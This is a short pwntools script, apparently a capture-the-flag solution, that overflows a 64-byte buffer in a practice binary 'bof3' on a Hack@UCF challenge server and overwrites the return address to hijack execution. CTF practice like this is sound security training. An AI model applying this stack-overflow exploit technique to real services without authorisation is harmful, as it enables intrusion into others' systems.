from pwn import *

exe = ELF("bof3")

context.binary = exe

# r = exe.debug(gdbscript="""
# c
# """)

r = remote("ctf.hackucf.org", 9002)

r.sendline(b"A"*64 + p32(0x08049256))

r.interactive()
